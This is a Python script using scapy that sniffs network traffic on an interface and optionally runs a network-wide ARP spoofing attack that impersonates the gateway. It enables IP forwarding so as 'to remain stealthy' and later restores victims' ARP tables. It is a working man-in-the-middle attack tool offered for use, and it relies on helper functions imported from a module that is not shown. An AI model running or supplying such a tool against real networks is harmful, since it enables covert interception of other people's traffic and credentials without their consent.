#!/usr/bin/env python3

import argparse
import subprocess
import threading
import platform as py_platform

# supress warning messages
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
conf.verb = 0

from req_infect import get_gateway, spoof_gateway, send_arp_req

def setup(args):
    if args.no_restore:
        return None

    print("Saving previous configuration to restore it later...")
    previous_conf = {}

    if args.ipv4_forward:
        print("Forwarding IPv4 traffic to remain stealthy")
        if py_platform.system() == 'Darwin':
            previous_conf['ipv4_forward'] = subprocess.run(['sysctl', '-e', 'net.inet.ip.forwarding'], stdout=subprocess.PIPE).stdout.decode('utf-8')

            subprocess.run(['sysctl', 'net.inet.ip.forwarding=1'])
        else:
            previous_conf['ipv4_forward'] = subprocess.run(['sysctl', '-e', 'net.ipv4.ip_forward'], stdout=subprocess.PIPE).stdout.decode('utf-8')

            subprocess.run(['sysctl', 'net.ipv4.ip_forward=1'])

    if args.spoof_gateway:
        previous_conf['gateway_ip'], previous_conf['gateway_mac'] = get_gateway(args.iface)
        previous_conf['spoof_lock'] = threading.Lock()
        previous_conf['spoof_thread'] = threading.Thread(target=keep_spoofing_gateway, args=(args.iface, previous_conf, previous_conf['spoof_lock']))
        previous_conf['spoof_thread'].start()


    return previous_conf

def keep_spoofing_gateway(iface, previous_conf, lock):
    while lock.acquire(blocking=False):
        lock.release()
        send_arp_req(iface, psrc=previous_conf['gateway_ip'], hwsrc=get_if_hwaddr(iface), hwdst='ff:ff:ff:ff:ff:ff', dst='ff:ff:ff:ff:ff:ff')
        print("Renewed gateway entry in posioned ARP tables...")
        time.sleep(10)

def teardown(args, previous_conf):
    if args.no_restore:
        print("Not restoring system configuration per your request")

    print("Restoring previous configuration...")
    if args.ipv4_forward:
        print("Restoring IPv4 traffic forwarding...")
        subprocess.run(['sysctl', previous_conf['ipv4_forward'].replace(" ", "")])
        # subprocess.run(['sysctl', 'net.ipv4.ip_forward=0'])

    if args.spoof_gateway:
        # stop spoofing
        previous_conf['spoof_lock'].acquire(blocking=False)

        # restore gateway entry in victims' ARP tables
        print("Restoring entries in victims' ARP tables...")
        for _ in range(2):
            send_arp_req(args.iface, psrc=previous_conf['gateway_ip'], hwsrc=previous_conf['gateway_mac'], dst='ff:ff:ff:ff:ff:ff')
        return


def respond_to_packet(req):
    print(req.summary())


def main():
    parser = argparse.ArgumentParser(description = 'A tool to sniff all traffic directed to an interface')
    parser.add_argument('iface', help='interface to listen for HTTP traffic')
    parser.add_argument('-f', '--ipv4-forward', action='store_true', help='forward traffic to remain stealthy')
    parser.add_argument('-t', '--filter', nargs=1, help='apply a filter to sniffed traffic')
    parser.add_argument('-g', '--spoof-gateway', action='store_true', help='set up an ARP spoofing attack directed to all the network spoofing the gateway')
    parser.add_argument('-n', '--no-restore', action='store_true', help='don\'t restore machine configuration after attack')
    args = parser.parse_args()

    # save system configuration
    previous_config = None
    previous_config = setup(args)

    print("Sniffing packets...")
    if args.filter:
        print("Filtering with \"%s\"" % args.filter[0])
        sniff(iface=args.iface, filter=args.filter[0], prn=respond_to_packet)
    else:
        sniff(iface=args.iface, prn=respond_to_packet)

    if args.no_restore:
        return

    # restore system configuration
    teardown(args, previous_config)

if __name__ == '__main__':
    main()
